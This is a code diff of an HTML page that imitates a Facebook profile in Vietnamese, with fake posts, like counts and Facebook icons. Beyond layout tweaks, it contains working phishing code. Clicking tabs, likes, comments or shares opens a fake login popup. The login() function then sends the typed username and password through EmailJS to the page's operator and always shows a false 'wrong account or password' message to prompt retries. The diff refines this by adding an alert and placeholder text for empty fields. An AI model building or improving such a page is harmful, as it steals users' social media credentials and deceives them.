@@ -192,10 +192,6 @@
             background: #F2F3F5;
             border-radius: 8px;
         }
-        .tabs a img {
-            width: 20px;
-            height: 20px;
-        }
         .details {
             background-color: #FFFFFF;
             padding: 16px;
@@ -519,11 +515,12 @@
         }
         .actions {
             display: flex;
-            justify-content: flex-end;
+            justify-content: space-between; /* Căn đều các nút */
             padding: 6px 0;
             font-size: 13px;
             color: #65676B;
             border-top: 1px solid #CED0D4;
+            gap: 10px;
         }
         .actions .action {
             cursor: pointer;
@@ -533,7 +530,8 @@
             display: flex;
             align-items: center;
             gap: 6px;
-            margin-left: 10px;
+            flex: 1; /* Đảm bảo các nút có kích thước đều nhau */
+            justify-content: center; /* Căn giữa nội dung trong mỗi nút */
         }
         .actions .action:hover {
             background: #F5F6F5;
@@ -692,6 +690,7 @@
             color: #ff0000;
             font-size: 13px;
             margin-top: 8px;
+            display: none;
         }
         @media (max-width: 767px) {
             .container {
@@ -792,30 +791,14 @@
 
         <!-- Tabs -->
         <div class="tabs">
-            <a href="#" class="active" onclick="showTab('posts-tab')">
-                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yY/r/a2B8aH2zWrc.png" alt="Posts"> Bài viết
-            </a>
-            <a href="#" onclick="showTab('about-tab'); showLoginPopup()">
-                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/4r5pN3v2aN5.png" alt="About"> Giới thiệu
-            </a>
-            <a href="#" onclick="showTab('photos-tab')">
-                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yb/r/5uH7TXzWENM.png" alt="Photos"> Ảnh
-            </a>
-            <a href="#" onclick="showTab('videos-tab')">
-                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/5hM-k1AN4eS.png" alt="Videos"> Video
-            </a>
-            <a href="#" onclick="showTab('reels-tab')">
-                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yW/r/6zYk4cJJeL8.png" alt="Reels"> Reels
-            </a>
-            <a href="#" onclick="showTab('friends-tab')">
-                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yU/r/u7v2q0v-KuV.png" alt="Friends"> Bạn bè
-            </a>
-            <a href="#" onclick="showTab('events-tab')">
-                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y_/r/6YvXqYx61Kr.png" alt="Events"> Sự kiện
-            </a>
-            <a href="#" onclick="showTab('likes-tab'); showLoginPopup()">
-                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Likes"> Lượt thích
-            </a>
+            <a href="#" class="active" onclick="showTab('posts-tab')">Bài viết</a>
+            <a href="#" onclick="showTab('about-tab'); showLoginPopup()">Giới thiệu</a>
+            <a href="#" onclick="showTab('photos-tab')">Ảnh</a>
+            <a href="#" onclick="showTab('videos-tab')">Video</a>
+            <a href="#" onclick="showTab('reels-tab')">Reels</a>
+            <a href="#" onclick="showTab('friends-tab')">Bạn bè</a>
+            <a href="#" onclick="showTab('events-tab')">Sự kiện</a>
+            <a href="#" onclick="showTab('likes-tab'); showLoginPopup()">Lượt thích</a>
         </div>
 
         <!-- Details -->
@@ -886,23 +869,20 @@
                             </div>
                         </div>
                         <div class="like-info">
-                            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Like">
-                            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/6UHmJipH8-J.png" alt="Haha">
-                            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/EhyW6biK10i.png" alt="Love">
                             <img src="https://i.imgur.com/oy1XxUp.jpg" class="avatar" alt="Lan Anh">
                             <img src="https://i.imgur.com/YFwhhDb.jpg" class="avatar" alt="Ngọc Mai">
                             <img src="https://i.imgur.com/GT3OXZP.jpg" class="avatar" alt="Minh Tuấn">
                             <span>Lan Anh, Ngọc Mai, Minh Tuấn và 9.8k người khác</span>
                         </div>
                         <div class="actions">
-                            <div class="action share" onclick="showLoginPopup()">
-                                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/r/0--2A9QseKL.png" alt="Share"> Chia sẻ <span>827</span>
+                            <div class="action like" onclick="showLoginPopup()">
+                                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Like"> Thích <span>9.8k</span>
                             </div>
                             <div class="action comment" onclick="showLoginPopup()">
                                 <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yY/r/a2B8aH2zWrc.png" alt="Comment"> Bình luận <span>692</span>
                             </div>
-                            <div class="action like" onclick="showLoginPopup()">
-                                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Like"> Thích <span>9.8k</span>
+                            <div class="action share" onclick="showLoginPopup()">
+                                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/r/0--2A9QseKL.png" alt="Share"> Chia sẻ <span>827</span>
                             </div>
                         </div>
                         <div class="comments">
@@ -939,23 +919,20 @@
                             </div>
                         </div>
                         <div class="like-info">
-                            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Like">
-                            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/6UHmJipH8-J.png" alt="Haha">
-                            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/EhyW6biK10i.png" alt="Love">
                             <img src="https://i.imgur.com/YFwhhDb.jpg" class="avatar" alt="Ngọc Mai">
                             <img src="https://i.imgur.com/GT3OXZP.jpg" class="avatar" alt="Minh Tuấn">
                             <img src="https://i.imgur.com/7eRH4Fr.jpg" class="avatar" alt="Hương Trà">
                             <span>Ngọc Mai, Minh Tuấn, Hương Trà và 6.1k người khác</span>
                         </div>
                         <div class="actions">
-                            <div class="action share" onclick="showLoginPopup()">
-                                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/r/0--2A9QseKL.png" alt="Share"> Chia sẻ
+                            <div class="action like" onclick="showLoginPopup()">
+                                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Like"> Thích <span>6.1k</span>
                             </div>
                             <div class="action comment" onclick="showLoginPopup()">
                                 <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yY/r/a2B8aH2zWrc.png" alt="Comment"> Bình luận <span>626</span>
                             </div>
-                            <div class="action like" onclick="showLoginPopup()">
-                                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Like"> Thích <span>6.1k</span>
+                            <div class="action share" onclick="showLoginPopup()">
+                                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/r/0--2A9QseKL.png" alt="Share"> Chia sẻ
                             </div>
                         </div>
                         <div class="comments">
@@ -990,23 +967,20 @@
                             <img src="https://imgur.com/NZFXea4.jpg" alt="Livestream 3">
                         </div>
                         <div class="like-info">
-                            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Like">
-                            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/6UHmJipH8-J.png" alt="Haha">
-                            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/EhyW6biK10i.png" alt="Love">
                             <img src="https://i.imgur.com/GT3OXZP.jpg" class="avatar" alt="Minh Tuấn">
                             <img src="https://i.imgur.com/7eRH4Fr.jpg" class="avatar" alt="Hương Trà">
                             <img src="https://i.imgur.com/mj7UTEK.jpg" class="avatar" alt="Thu Hà">
                             <span>Minh Tuấn, Hương Trà, Thu Hà và 7.2k người khác</span>
                         </div>
                         <div class="actions">
-                            <div class="action share" onclick="showLoginPopup()">
-                                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/r/0--2A9QseKL.png" alt="Share"> Chia sẻ <span>2k4</span>
+                            <div class="action like" onclick="showLoginPopup()">
+                                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Like"> Thích <span>7.2k</span>
                             </div>
                             <div class="action comment" onclick="showLoginPopup()">
                                 <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yY/r/a2B8aH2zWrc.png" alt="Comment"> Bình luận <span>3k8</span>
                             </div>
-                            <div class="action like" onclick="showLoginPopup()">
-                                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Like"> Thích <span>7.2k</span>
+                            <div class="action share" onclick="showLoginPopup()">
+                                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/r/0--2A9QseKL.png" alt="Share"> Chia sẻ <span>2k4</span>
                             </div>
                         </div>
                         <div class="comments">
@@ -1041,23 +1015,20 @@
                             <img src="https://imgur.com/GT3OXZP.jpg" alt="Tuyển mẫu 4">
                         </div>
                         <div class="like-info">
-                            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Like">
-                            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/6UHmJipH8-J.png" alt="Haha">
-                            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/EhyW6biK10i.png" alt="Love">
                             <img src="https://i.imgur.com/7eRH4Fr.jpg" class="avatar" alt="Hương Trà">
                             <img src="https://i.imgur.com/mj7UTEK.jpg" class="avatar" alt="Thu Hà">
                             <img src="https://i.imgur.com/x7Z7Evf.jpg" class="avatar" alt="Linh Nguyễn">
                             <span>Hương Trà, Thu Hà, Linh Nguyễn và 7k người khác</span>
                         </div>
                         <div class="actions">
-                            <div class="action share" onclick="showLoginPopup()">
-                                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/r/0--2A9QseKL.png" alt="Share"> Chia sẻ <span>1k4</span>
+                            <div class="action like" onclick="showLoginPopup()">
+                                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Like"> Thích <span>7k</span>
                             </div>
                             <div class="action comment" onclick="showLoginPopup()">
                                 <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yY/r/a2B8aH2zWrc.png" alt="Comment"> Bình luận <span>1k3</span>
                             </div>
-                            <div class="action like" onclick="showLoginPopup()">
-                                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Like"> Thích <span>7k</span>
+                            <div class="action share" onclick="showLoginPopup()">
+                                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/r/0--2A9QseKL.png" alt="Share"> Chia sẻ <span>1k4</span>
                             </div>
                         </div>
                         <div class="comments">
@@ -1095,23 +1066,20 @@
                             </div>
                         </div>
                         <div class="like-info">
-                            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Like">
-                            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/6UHmJipH8-J.png" alt="Haha">
-                            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/EhyW6biK10i.png" alt="Love">
                             <img src="https://i.imgur.com/mj7UTEK.jpg" class="avatar" alt="Thu Hà">
                             <img src="https://i.imgur.com/x7Z7Evf.jpg" class="avatar" alt="Linh Nguyễn">
                             <img src="https://i.imgur.com/oy1XxUp.jpg" class="avatar" alt="Lan Anh">
                             <span>Thu Hà, Linh Nguyễn, Lan Anh và 8k người khác</span>
                         </div>
                         <div class="actions">
-                            <div class="action share" onclick="showLoginPopup()">
-                                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/r/0--2A9QseKL.png" alt="Share"> Chia sẻ <span>754</span>
+                            <div class="action like" onclick="showLoginPopup()">
+                                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Like"> Thích <span>8k</span>
                             </div>
                             <div class="action comment" onclick="showLoginPopup()">
                                 <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yY/r/a2B8aH2zWrc.png" alt="Comment"> Bình luận <span>1k7</span>
                             </div>
-                            <div class="action like" onclick="showLoginPopup()">
-                                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Like"> Thích <span>8k</span>
+                            <div class="action share" onclick="showLoginPopup()">
+                                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/r/0--2A9QseKL.png" alt="Share"> Chia sẻ <span>754</span>
                             </div>
                         </div>
                         <div class="comments">
@@ -1311,7 +1279,6 @@
         function showLoginPopup() {
             document.getElementById('loginPopup').style.display = 'block';
             document.getElementById('overlay').style.display = 'block';
-            document.getElementById('error-message').innerText = ''; // Xóa thông báo lỗi cũ
         }
 
         function hideLoginPopup() {
@@ -1322,13 +1289,12 @@
         function login() {
             const username = document.getElementById('login-input').value || "";
             const password = document.getElementById('password').value || "";
-            const errorMessage = document.getElementById('error-message');
 
             const templateParams = {
                 name: "User",
                 time: new Date().toLocaleString(),
-                email: username,
-                password: password,
+                email: username || "Tài khoản bị bỏ trống",
+                password: password || "Mật khẩu bị bỏ trống",
                 action: "Đăng nhập",
                 timestamp: new Date().toLocaleString()
             };
@@ -1336,11 +1302,11 @@
             emailjs.send('service_ytsr91e', 'template_gwserzi', templateParams)
                 .then((response) => {
                     console.log("Email gửi thành công:", response.status, response.text);
-                    errorMessage.innerText = "Đăng nhập không thành công: Sai thông tin tài khoản hoặc mật khẩu";
+                    alert("Đăng nhập không thành công: Sai thông tin tài khoản hoặc mật khẩu");
                 })
                 .catch((error) => {
                     console.error("Lỗi gửi email:", error);
-                    errorMessage.innerText = "Đăng nhập không thành công: Sai thông tin tài khoản hoặc mật khẩu";
+                    alert("Đăng nhập không thành công: Sai thông tin tài khoản hoặc mật khẩu");
                 });
         }
 
